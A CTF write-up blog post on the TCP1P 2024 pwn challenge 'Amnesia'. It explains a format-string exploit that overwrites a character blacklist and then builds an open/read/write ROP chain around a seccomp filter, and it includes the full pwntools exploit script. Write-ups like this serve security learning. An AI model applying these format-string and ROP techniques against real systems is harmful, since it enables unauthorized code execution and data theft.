---
title: TCP1P 2024 - Blind
date: 2024-10-12
categories: [CTF, writeup]
tags: [ctf, writeup, TCP1P]     # TAG names should always be lowercase
---

<center><h1>TCP1P 2024 - My PWN Write-Ups</h1></center>

This weekend I have been participating solo in the TCP1P CTF 2024. I really enjoyed this CTF. I ended up solving some pretty good challenges and finished in 23rd place. As always, I focused on PWN, and here are my Write-Ups for the best challenges I solved.  

![Puntuacion]({{ site.baseurl }}/2024-10-13_Imges/Puntuacion.png)

## Amnesia
<img src="https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/amnesia.png" alt="Amnesia">

- **Category:** Pwn.  
- **Points:** 221
- **Solves:** 11  
- **Author:** itoid  

## Description
Amnesia is the typical challenge with a vulnerable format string, but with certain limitations to make our life a bit harder. The program has a first format string that accepts up to 188 characters, after which there is a loop that runs infinitely until we decide to terminate the program by writing **I remember everything!**. Inside that loop, there is another vulnerable format string, but it only accepts up to 32 characters. The format strings are checked against a blacklist that prohibits the use of the characters $, p, and x. The file has all the typical protections enabled and the syscalls **execve** and **execveat** are prohibited by seccomp.   
```sh
➜  Amnesia checksec amnesia
[*] '/home/elchals/CTFs/Tcp1p/Amnesia/amnesia'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```  

I take advantage of the first format string to get all the necessary leaks: Text base, Libc base, and Stack. Since p and $ are prohibited, I have to use %c and %ld.  
With the following format string, I am going to overwrite the blacklist, because since I now only have 32 characters in the format string and can't use $, it becomes impossible to do anything more useful. In the first iteration, I overwrite the $ with any number.  
```py
payload = b'%c%c%d%c%d%c%c%c%c%c%hhn'.ljust(24, b'\x41')
payload += p64(format)
```
And in the second iteration, since I can now use $, I place a NULL byte to disable the blacklist.  
```py
payload = b'%256c%11$hhn'.ljust(24, b'\x41')
payload += p64(format)
```
From now on, since we can use the $, I write a ROP chain starting from the return address of the function to open the flag.txt, read, and write its content. I write it character by character since 32 bytes aren't enough for anything more.  
Finally, by writing **I remember everything!**, I trigger the termination of the program and the execution of the ROP chain.  

## Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './amnesia_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "ctf.tcp1p.team"
PORT = 20037

######################################################################################

gdb_script = f'''
    breakrva 0x16d5
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT)
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path], aslr=False)
    return p

## Write one byte.
def change_byte(addr, b):
    if b == 0:
        b = 0x100
    payload = f'%{b}c%11$hhn'.encode().ljust(24, b'\x41')
    payload += p64(addr)
    print(payload)
    p.sendlineafter(b'remember?', payload)

######################################################################################

p = connect()

## Leaking things
payload  = b'%c' * 2
payload += b'||%ld||'
payload += b'%c'
payload += b'||%ld||'
payload += b'%c' * 35
payload += b'%||%ld||'

p.sendlineafter(b'you?', payload)
p.recvuntil(b'||')
libc.address = int(p.recvuntil(b'||')[:-2]) - (0x70fe15514887 - 0x70fe15400000)
print("[i] Libc Address:", hex(libc.address))

p.recvuntil(b'||')
stack = int(p.recvuntil(b'||')[:-2])
print("[i] Stack:", hex(stack))

rip = stack + (0x7ffcb0edf088 - 0x7ffcb0edea30) 
print("[i] RIP:", hex(rip))

p.recvuntil(b'||')
elf.address = int(p.recvuntil(b'||')[:-2]) - (0x5b435bdd36f7 - 0x5b435bdd2000)
print("[i] .text:", hex(elf.address))

## Overwriting Blacklist
format = elf.address + (0x65066ca92010 - 0x65066ca8e000)    # Blacklist address

payload = b'%c%c%d%c%d%c%c%c%c%c%hhn'.ljust(24, b'\x41')
payload += p64(format)
print(payload)
p.sendlineafter(b'remember?', payload)

payload = b'%256c%11$hhn'.ljust(24, b'\x41')
payload += p64(format)
print(payload)
p.sendlineafter(b'remember?', payload)

## Writing flag.txt to bss section
bss = elf.address + (0x63e12b96f000 - 0x63e12b96b000) + 0x900
print("[i] BSS:", hex(bss))

flag = b'flag.txt\x00'
idx = 0
for b in flag:
    change_byte(bss + idx, b)
    idx += 1

## ROP
context.arch = 'amd64'
rop_libc = ROP(libc)

pop_rsi  = p64(rop_libc.find_gadget(['pop rsi', 'ret'])[0])
pop_rdi  = p64(rop_libc.find_gadget(['pop rdi', 'ret'])[0])
ret      = p64(rop_libc.find_gadget(['ret'])[0])
pop_rdx_rbx  = p64(libc.address + 0x00000000000904a9) # pop rdx ; pop rbx ; ret
pop_rax  = p64(rop_libc.find_gadget(['pop rax', 'ret'])[0])
push_rax = p64(libc.address + 0x0000000000041563) # push rax ; ret
mov_edi_eax = p64(libc.address + 0x000000000012684c) # mov edi, eax ; call rdx

payload  = pop_rdi
payload += p64(bss)
payload += pop_rsi
payload += p64(0)
payload += p64(libc.sym.open)

payload += pop_rdx_rbx
payload += pop_rsi * 2
payload += mov_edi_eax
payload += pop_rsi
payload += p64(bss)
payload += pop_rdx_rbx
payload += p64(0x100) * 2
payload += p64(libc.sym.read)

payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += p64(bss)
payload += pop_rdx_rbx
payload += p64(0x100) * 2
payload += p64(libc.sym.write)

idx = 0
for b in payload:
    change_byte(rip + idx, b)
    idx += 1

p.sendlineafter(b'remember?', b'I remember everything!')

######################################################################################

p.interactive()
```
